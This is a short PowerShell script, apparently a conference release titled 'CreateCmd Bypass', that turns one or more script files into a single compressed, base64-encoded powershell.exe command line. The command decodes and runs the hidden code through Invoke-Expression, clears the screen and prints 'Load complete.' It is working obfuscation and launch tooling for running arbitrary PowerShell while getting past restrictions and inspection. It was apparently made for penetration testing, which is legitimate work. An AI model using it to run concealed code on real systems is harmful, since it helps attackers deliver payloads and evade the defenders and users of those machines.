//
// PowerShell CreateCmd Bypass by Kathy Peters, Josh Kelley (winfang) and Dave Kennedy (ReL1K)
// Defcon Release
//
//
//
param($Filenames, [bool]$EncodeIt=$false);
if (-not $Filenames)
{
    Write-Host "Usage: createcmd.ps1 [-Filenames] <string[]> [-EncodeIt <bool>]"  
    Write-Host "  Returns a powershell command line with contents of <Filesnames> concatenated and "
    Write-Host "  encoded into a compressed stream which will be uncompressed and invoked on startup."
    Write-Host "  Large code files may exceed 8K cmd limits of DOS and will not load correctly."
    Write-Host "  Do not use EncodeIt on large files. The command line will be too long for DOS to handle."
    Write-Host "    To write to a file that dos can read, use ascii encoding. For example:"
    Write-Host "      PS>.\createcmd.ps1 mycode.ps1 `$false | Out-File mycmd.bat ascii"
    Write-Host "    To concat multiple files together, pass in an array of strings or output from ls like this:"
    Write-Host "      PS>.\createcmd.ps1 `$(ls myfile*.ps1) | Out-File mycmd.bat ascii"
    return;
}
$contents = gc $Filenames;

$ms = New-Object IO.MemoryStream
$cs = New-Object IO.Compression.DeflateStream ($ms, [IO.Compression.CompressionMode]::Compress);
$sw = New-Object IO.StreamWriter ($cs, [Text.Encoding]::ASCII);
$contents | %{
    $sw.WriteLine($_);
    }
$sw.Close();
$code = [Convert]::ToBase64String($ms.ToArray());
$command = "Invoke-Expression `$(New-Object IO.StreamReader (" +
    "`$(New-Object IO.Compression.DeflateStream (" +
    "`$(New-Object IO.MemoryStream (,`$([Convert]::FromBase64String(`"$code`")))), " +
    "[IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd();clear;`"Load complete.`""
# Command version that builds the code from args passed to the script.
# Don't use. -Command lets you pass args to the command, but -encodedCommand doesn't, which doesn't help with the 
# command line length problem.
#$command_using_args = "Invoke-Expression `$(New-Object IO.StreamReader (" +
#    "`$(New-Object IO.Compression.DeflateStream (" +
#    "`$(New-Object IO.MemoryStream (,`$([Convert]::FromBase64String([string]::Join(`"`",`$args)))))," +
#    "[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd();clear;`"Load complete.`""

$doscommand = "powershell.exe -NoExit {0} `"{1}`"";

if ($EncodeIt)
{
    $doscommand -f "-encodedCommand",$([Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($command)));
}
else
{
    $doscommand -f "-Command",$command.Replace("`"", "\`"");
}
